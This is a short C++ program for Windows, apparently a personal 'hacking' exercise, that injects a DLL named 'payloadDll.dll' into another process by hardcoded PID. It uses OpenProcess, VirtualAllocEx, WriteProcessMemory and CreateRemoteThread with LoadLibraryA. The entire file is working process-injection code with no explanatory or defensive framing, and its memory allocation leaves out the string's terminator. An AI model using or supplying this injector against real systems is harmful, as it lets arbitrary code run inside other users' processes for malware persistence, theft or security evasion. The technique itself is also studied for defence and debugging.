#include <bits/stdc++.h>
#include "windows.h"

bool Inject(DWORD pId, const char *dllName);

using namespace std;

int main()
{
	Inject(6528, "C:\\Users\\ajaer\\code\\hacking\\dllInjection2\\payloadDll.dll");
	return 0;
}

bool Inject(DWORD pId, const char *dllName)
{
	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, false, pId);
	if (h){
		VOID *LoadLibAddr = (VOID *)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
		void  *dereercomp = VirtualAllocEx(h, NULL, strlen(dllName), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		WriteProcessMemory(h, dereercomp, dllName, strlen(dllName), NULL);
		HANDLE asdc = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, NULL, NULL);
		cout << asdc << "\n";
		cout << LoadLibAddr << "\n";
		DWORD x = GetLastError();
		cout << x << "\n";
		cout << h;
		WaitForSingleObject(asdc, INFINITE);

		VirtualFreeEx(h, dereercomp, strlen(dllName), MEM_RELEASE);
		CloseHandle(asdc);
		return true;

	}
	return false;
}
